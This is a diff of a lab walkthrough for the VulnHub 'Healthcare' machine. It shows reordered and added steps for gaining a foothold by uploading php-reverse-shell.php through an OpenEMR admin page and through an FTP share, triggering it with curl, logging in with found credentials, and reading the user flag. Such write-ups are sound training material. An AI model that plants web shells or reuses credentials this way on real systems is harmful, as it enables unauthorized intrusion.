@@ -195,7 +195,31 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 	```
 6. Login w/ admin:ackbar
 
-## TCP/21 - FTP
+## Back to TCP/80 - OpenEMR RCE
+1. Since we do not have TCP/22 up, it is very likely we gain initial foothold via RCE
+2. Search RCE exploits for `OpenEMR v4.1.0`
+	
+	| Exploit Title                             | Path                                 |
+	| ----------------------------------------- | ------------------------------------ |
+	| OpenEMR 5.0.1 - Remote Code Execution (1) | php/webapps/48515.py                 |
+	| OpenEMR-RCE <= 5.0.1                          | https://github.com/noraj/OpenEMR-RCE |
+
+3. All failed, probably because `openemr/portal/import_template.php` does not exist
+4. Upload reverse shell manually
+	1. Proceed to `Administration -> Others`
+	2. Insert `php-reverse-shell.php`
+		![](images/Pasted%20image%2020220202160559.png)
+	3. Execute `php-reverse-shell.php` 
+		```
+		┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp/192.168.110.8/Downloads]
+		└─# curl 192.168.110.8/openemr/sites/default/images/php-reverse-shell.php -s
+		```
+	4. Apache shell obtained
+		![](images/Pasted%20image%2020220202160954.png)
+
+# Initial Foothold 2
+## TCP/21 - FTP - Upload Reverse Shell
+- Instead of inserting reverse shell @ OpenEMR, we upload a reverse shell through FTP
 1. Able to access FTP w/ medical:medical
 	```
 	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp]
@@ -277,37 +301,48 @@ er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
 		medical-medical
 		```
 	- `OpenEMR Passwords.pdf`
-		![](images/Pasted%20image%2020220202152047.png)
-5. FTP is likely a rabbit hole
+		- Contains some default credentials, not useful
+5. Head back to FTP, found out that the entire filesystem `/` is shared in FTP
+6. Path to `/var/www/html/openemr`, insert `php-reverse-shell.php`
+	```
+	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit/openemr_rce]
+	└─# ftp -nv $ip 
+	Connected to 192.168.110.8.
+	220 ProFTPD 1.3.3d Server (ProFTPD Default Installation) [192.168.110.8]
+	ftp> user medical
+	331 Password required for medical
+	Password: 
+	230 User medical logged in
+	Remote system type is UNIX.
+	Using binary mode to transfer files.
+	ftp> cd /var/www/html/openemr
+	250 CWD command successful
+	ftp> put php-reverse-shell.php 
+	local: php-reverse-shell.php remote: php-reverse-shell.php
+	200 PORT command successful
+	150 Opening BINARY mode data connection for php-reverse-shell.php
+	226 Transfer complete
+	5495 bytes sent in 0.00 secs (30.2916 MB/s)
+	```
+7. Execute reverse shell
+	```
+	┌──(root💀kali)-[~/vulnHub/Healthcare]
+	└─# curl 192.168.110.8/openemr/php-reverse-shell.php
+	```
 
-## Back to TCP/80 - OpenEMR RCE
-1. Since we do not have TCP/22 up, it is very likely we gain initial foothold via RCE
-2. Search RCE exploits for `OpenEMR v4.1.0`
-	
-	| Exploit Title                             | Path                                 |
-	| ----------------------------------------- | ------------------------------------ |
-	| OpenEMR 5.0.1 - Remote Code Execution (1) | php/webapps/48515.py                 |
-	| OpenEMR-RCE <= 5.0.1                          | https://github.com/noraj/OpenEMR-RCE |
 
-3. All failed, probably because `openemr/portal/import_template.php` does not exist
-4. Upload reverse shell manually
-	1. Proceed to `Administration -> Others`
-	2. Insert `php-reverse-shell.php`
-		![](images/Pasted%20image%2020220202160559.png)
-	3. Execute `php-reverse-shell.php` 
-		```
-		┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp/192.168.110.8/Downloads]
-		└─# curl 192.168.110.8/openemr/sites/default/images/php-reverse-shell.php -s
-		```
-	4. Apache shell obtained
-		![](images/Pasted%20image%2020220202160954.png)
-		
 # Privilege Escalation
-
 ## Medical - Via Creds Found
 1. Earlier we found medical creds
 2. Switch to medical w/ medical:medical
 	![](images/Pasted%20image%2020220202164335.png)
+3. User Flag
+	```
+	sh-4.1$ cat user.txt
+	cat user.txt
+	d41d8cd98f00b204e9800998ecf8427e
+	sh-4.1$ 
+	```
 ## Root - Via SUID Binary (Path Hijacking)
 1. Check for SUID Binaries
 	```
